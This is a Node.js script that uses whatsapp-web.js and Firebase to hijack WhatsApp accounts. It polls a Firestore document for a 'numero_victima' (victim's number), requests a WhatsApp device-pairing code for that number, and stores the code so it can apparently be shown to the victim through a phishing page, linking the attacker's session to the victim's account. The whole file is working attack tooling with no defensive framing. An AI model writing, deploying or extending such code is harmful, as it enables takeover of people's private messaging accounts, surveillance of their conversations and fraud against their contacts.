const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

// CONFIGURACIÓN DE FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// REVISIÓN MANUAL CADA 5 SEGUNDOS (Más estable que Snapshot)
setInterval(async () => {
    try {
        const docRef = db.collection("wa_clon_global").doc("current_session");
        const snap = await docRef.get();
        
        if (snap.exists) {
            const data = snap.data();
            // Si hay un número y el status es solicitar código
            if (data.status === "solicitando_codigo" && !data.pairingCode) {
                console.log("ENTRANDO A WHATSAPP PARA: " + data.numero_victima);
                const code = await client.requestPairingCode(data.numero_victima);
                
                await docRef.update({
                    pairingCode: code,
                    status: "mostrando_codigo"
                });
                console.log("¡CÓDIGO GENERADO!: " + code);
            }
        }
    } catch (e) {
        // Error silencioso
    }
}, 5000);

client.on('ready', () => {
    console.log("CONEXIÓN DE WHATSAPP EXITOSA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log("Error Init:", e));

// SERVIDOR DE SALUD PARA RENDER
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.end('ROBOT ONLINE');
}).listen(port, () => {
    console.log("Robot activo en puerto " + port);
});
